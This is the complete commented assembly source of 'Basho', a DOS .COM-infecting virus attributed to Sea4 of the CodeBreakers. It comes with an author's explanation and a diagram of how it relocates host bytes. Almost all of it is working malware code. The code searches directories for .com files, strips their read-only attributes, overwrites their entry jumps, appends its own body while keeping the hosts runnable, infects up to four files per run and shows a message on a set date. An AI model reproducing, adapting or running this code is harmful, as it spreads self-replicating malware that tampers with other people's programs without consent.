; NAME: Basho.com
; SIZE: 431 bytes
; AUTHOR: Sea4
; TYPE: Appending in a weird way.
; ENCRYPTION: No
; DT: Yes
; STEALTH: No
; REPAIRABLE: Yes
; PAYLOAD: Yes   
; RESIDENT: No
; ROI: 4 files per run
; POLYMORPHIC: No

; Explanation.
; Its not very easy to understand at first glance how it even possibly works.
; But the plain and simple fact is that it DOES work, and it works well. I
; thought of the concept right before I went to sleep the other night, maybe
; I was having hallucinations or something. I am not even sure if its an
; original idea. But I like it!

; WTF it does:
; Upon execution the JMP at the beginning of the infected file will jump to
; what I call the virus' launching pad. Its does a few menial tasks like
; saving/restoring program code and the DTA. It also launches the true virus.
; The true virus is stored where actual program code used to be, I call that
; area of program code P3.
; P1 = Is the area the infecting JMP is stored.
; P2 = Is the middle of infected program.
; P3 = The last bytes of program that have been moved to
;         make room for Basho.
; V1 = Main Body of BASHO
; V2 = Launching Pad
; Upon execution of the true virus code, files will be infected, and the bomb
; will be tested, etc. etc. Afterward the True Virus Code will RET back to
; the launchpad, and the P3 area will be restored as well as the DTA, and
; the host file will be run 100% without error. ( or at least I think so ).

; Why the hell I did it:
; Just to confuse everyone, including the AV companies and myself.

; -- Sea4 of the CodeBreakers

;***************************************************************  
; A little Map      
;==============               ==============          
;|            |               |____________| <-- Jmp To Launching 
;|            |               |            |     Pad ( P1 )
;|            |               | Program    |
;| UnInfected |               | bytes that |
;|  Host      |               | are not    |
;|            |               | affected.  |
;|            |               |  ( P2 )    |
;|            |               |            |
;|            |               |            |
;|            |               |            |
;|            |               |____________|
;|            |               |            |
;|            | File Length   | Main body  |
;|            | Before Infect.| of BASHO.  |
;|            |       |       |   ( V1 )   |
;|            |       |       |          * | <-- Ret to Launch Pad
;==============  <<- - - ->>  ==============
;                             | Bytes moved|
;    Additional Area          |to make room|
; Now that file has been      |for BASHO.  |
; infected with BASHO         |   ( P3 )   |
;                             |____________|
;                             |Launch Pad  |
; P3 and the main body        |   ( V2 )   |
; of BASHO have the same      ============== <-- New file length
; length.
;
;***************************************************************

start:
jmp  StartV2

startV1:         ; Actual Virus code
V1Length  EQU endV1-startV1

mov  [bp+victims],cl     ; Starts at 0 for victem count

mov  ah,47h              ; Function 47h: Get Current Directory
cwd                      ; 00h in DL = Default Drive
lea  si,[bp+Cur_DIR]     ; 64 byte buffer for pathname
int  21h                 ; Calls DOS to write current DIR to CurDIR

Dot_Dot:
jmp  short infectDIR
Next_Dir:
mov  ah,3Bh              ; Function 3Bh: Change Directory
lea  dx,[bp+Dot_mask]    ; Saved starting directory
int  21h                 ; Calls DOS or Dir Change
jnc  Dot_Dot

jmp  Badstuff            ; All directories have been killed, lets go

InfectDIR:
; Here is our find file thingy
mov  ah,4Eh         ; Find files
mov  cx,7           ; Looking for all file types
lea  dx,[bp+com_mask]    ; Points to the *.com
FindNext:                
int  21h            ; Find all the com files

jnc  Open           ; Success
jmp  Next_DIR       ; None left in this directory, lets move

Move_FP:            ; Move file Pointer call
mov  ax,4200h
Here:
xor  cx,cx
int  21h
ret

Open:
; Set attrib to 0, so we can write over read only files and such
mov  ax,4301h            ; Set attrib to 0
lea  dx,[bp+File_name]
Call Here

; Opens file for read/write access
mov  ax,3D02h            ; Open File
int  21h

xchg bx,ax          ; Gives the file handle from AX to BX in one byte.

mov  ah,3Fh              ; Read first three bytes
mov  cl,3                ; 3 bytes, CX holds number of bytes to read
lea  dx,[bp+saved]       ; Buffer for saved bytes :)
int  21h                 ; Tells DOS to read 'em

; Check infection criteria
; If file is too large it may crash, and too small is easily noticable
xor  cx,cx               ; See if file is larger than 1 segment
cmp  cx,[bp+File_size_off] ; 9Ch holds the segment size, Basho doesn't handle
                         ; files larger than one segment, so we can't
                         ; infect something larger than FFFFh bytes
jnz  Close               ; Its more than 1 segment lets escape

mov  ax,[bp+File_size]            ; Retrieves offset size of target file

; File must be greater than 1k
; Keeping smaller files from being infected
cmp  ax,400h   ; 400h = 1024 bytes ( 1k )
jc   Close     ; Its too small, get the hell outta here

; File must be less than 61440
; Stack errors and wrapping of bytes may occur if the
; file + virus + buffer excedes 1 segment ( FFFFh bytes )
cmp  ax,0F000h ; 61440, to provide room for buffer and virus size
jnc  Close     ; To big, may cause errors, can't do it

push ax                       ; Saves file size for later 
sub  ax,3                     ; Taking into account the JMP
push ax                       ; Save that for the new 3 bytes

; Test 2nd + 3rd bytes for JMP location to V2 ( LaunchPad )
; Here we check for previous infection by testing if the jump looks
; like one created by a previous running of Basho.
sub  ax,V2Length    ; We need the new jump to go to the launch pad
cmp  ax,[bp+saved+1]     ; Tests if the file has been infected with Basho
jz   Close

pop  ax                       ; Retrieves jump location
add  ax,V1Length              ; Adds the length added by virus
mov  [bp+jumpto],ax           ; Sets jump location for victim

; Set FP to beginning
xor  dx,dx
call Move_FP

; Write new JMP to victim
mov  cl,3                     ; Length of area to write ( 3 bytes )
lea  dx,[bp+jumping]          ; its the location of the new JMP
mov  ah,40h
int  21h

; Move FP to get bytes from End of victim
; Since DX specifies the location in bytes from beginning we want
; to move the FP, and since we want to move to End of File-V1Length
; We take the entire filesize-V1Length, and move that far from
; the beginning of file.
pop  dx                       ; Retrieves filesize
sub  dx,V1Length              ; Places location in file at End-V1Length
push dx                       ; Saves this spot for the write
call Move_FP

; Here is where we retrieve the P3 file bytes and save them for later
mov  ah,3Fh                   ; Function 3Fh: Read from file/device
mov  cx,V1Length              ; Number of bytes to read
lea  dx,[bp+startP3]          ; Actual area for file bytes
int  21h                      ; Duh, it read those bytes into the P3 area

; Now we write the virus code into that area we just made
pop  dx                       ; Retrieves location by previous Move FP
call Move_FP

mov  cx,endV2-startV1         ; Now we can just write all that area to
lea  dx,[bp+startV1]          ; The victem because we have prepared so well :)
mov  ah,40h
int  21h

inc  Byte Ptr  [bp+victims]   ; Increments our Byte counter

Close:
mov  ax,5701h            ; Set Date/Time stamps
mov  dx,[bp+File_Date]
mov  cx,[bp+File_Time]
int  21h

; Close File   
mov  ah,3Eh                   ; Function 3Eh: Close file
int  21h                      ; Shut that mo fo down

mov  ah,43h              ; Reset attributes
lea  dx,[bp+File_Name]
xor  cx,cx
mov  cl,[bp+Attributes]
int  21h

mov  ch,04h                   ; Only four files per run
cmp  [bp+victims],ch          ; Sees if we have had that many so far
jnc  BadStuff                 ; If so, run the bomb sequence

mov  ax,4F00h                 ; Jump to FindNext routines
jmp  FindNext


BadStuff:                     ; Payload
; Before starting the bomb, we head to original DIR

mov  ah,3Bh         ; Function 3Bh: Change Directory
lea  dx,[bp+Cur_DIR]; Saved starting directory
int  21h

; Activation checker
mov  ah,04h         ; Function 04h: Get Real Time Clock ( Date )
int  1Ah            ; INT 1Ah BIOS Time interrupt
                    ; Gets the date and puts the value into the following
                    ; registers.
          ; CH = Century
          ; CL = Year
          ; DH = Month
          ; DL = Day

cmp  dx,0701h       ; July 7th, I like this day.
jnz  Exit           ; Its not the date, we'll try another time

; Just displays a simple message
mov  ah,09h                   ; Function 09h: Write string to std output
lea  dx,[bp+message]          ; Where the message is stored
int  21h                      ; Announce our presence

Exit:
mov  sp,0FFFCh ; Restores the stack pointer to where the RET should go to
ret            ; I did this to make sure it would go back to the right spot
               ; Then return to caller.

virus_name     db   '[Basho]',0              ; Named after the poet
author         db   'Sea4, CodeBreakers',0   ; Me and who I work for
com_mask       db   '*.com',0      ; Com file mask
dot_mask       db   '..',0         ; Dot dot dir mask
saved          db   0CDh,20h,00h   ; Saved 3 bytes from infected files
jumping        db   0E9h           ; JMP
jumpto         db   0,0            ; Jump to launch pad
message        db   'The temple bell stops,',0Dh,0Ah   ; A lovely Haiku
               db   'But the sound keeps coming',0Dh,0Ah
               db   'Out of the flowers.',0Dh,0Ah,'$'

endV1:


startP3:       ; Program code that has been moved to accomodate our virus
db   V1Length  dup (90h)

endP3:


startV2:       ; Virus's little launching pad.
V2Length  EQU  endV2-startv2

; Pretty cut and dry delta offset thing
call Delta               ; Gets delta offsets
Delta:
pop  bp                  ; Retrieve Locale for BP
sub  bp,offset Delta     ; Subtracts that by the original to obtain
                         ; the location moved down in memory

mov  ah,1Ah                   ; Set new DTA, this is a first for me
lea  dx,[bp+New_Dta]
int  21h

; Rewrite first three bytes
lea  si,[bp+saved]            ; Where we saved em
mov  di,100h                  ; Start of Program, ( i.e. where they go )
movsb
movsw

lea  di,[bp+BufferP3]    ; This block moves P3 code into the buffer so the
lea  si,[bp+StartP3]     ; when the virus runs, it doesn't get overwritten
mov  cx,V1Length         ; Length of that area
rep  movsb               ; Move it out!!

call StartV1                  ; Normal Virus Code

lea  si,[bp+BufferP3]    ; Loads start of moved program code into SI
lea  di,[bp+startV1]     ; Virus location into DI
mov  cx,V1length         ; Virus code length
rep  movsb               ; Restores bytes

; Restores the saved DTA
mov  ah,1Ah    ; Set original DTA
mov  dx,80h
int  21h

push 100h ; We are gonna run the host program now
ret       ; Go for it

endV2:
Buffer:
New_Dta        db   21   dup  (90h)  ; DTA!!
Attributes     db   00h
File_time      dw   00h
File_date      dw   00h
File_size      dw   00h
File_size_off  dw   00h
File_name      db   13  dup  (0)
victims   db   0h        ; Victim count
Cur_DIR   db   64 dup (0)     ; Location of current DIR
BufferP3:
